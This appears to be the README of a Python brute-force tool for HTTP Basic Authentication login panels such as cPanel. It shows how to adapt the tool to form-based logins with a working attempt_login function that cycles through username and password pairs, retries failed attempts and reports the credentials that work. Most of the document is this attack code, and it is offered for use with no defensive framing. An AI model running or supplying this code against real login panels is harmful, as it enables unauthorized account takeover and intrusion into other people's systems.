### About 


This brute forcing script is made to target HTTP Basic Authentication login panels, not just cpanel.
The script can only work with panels that respond with a 401 Unauthorized error when incorrect credentials are supplied.
However, you can modify the script to work with other types of login panels, depending on the authentication mechanism they use. 

### Example:

* Form-Based Authentication

```
data = urllib.parse.urlencode({'username': u, 'password': p}).encode()
req = urllib.request.Request(login_url, data=data)
```
* Modification:

```
def attempt_login(self, username, password):
    attempt = 0
    success = False
    login_url = f"http://{self.server}/login"

    while attempt < RETRY_LIMIT and not success and not success_event.is_set():
        try:
            data = urllib.parse.urlencode({'username': username, 'password': password}).encode()
            req = urllib.request.Request(login_url, data=data)

            with urllib.request.urlopen(req) as response:
                if response.getcode() == 200:
                    print(f"SUCCESS: Username: {username} Password: {password}")
                    success_event.set()
                    success = True

        except urllib.error.HTTPError as e:
            print(f"Failed Login - User: {username} Password: {password}")
        except Exception as e:
            print(f"Connection error for {username}:{password} - Retry {attempt + 1}")
        attempt += 1
```

* You can see the help menu by running:

```
python bruteforce.py
```
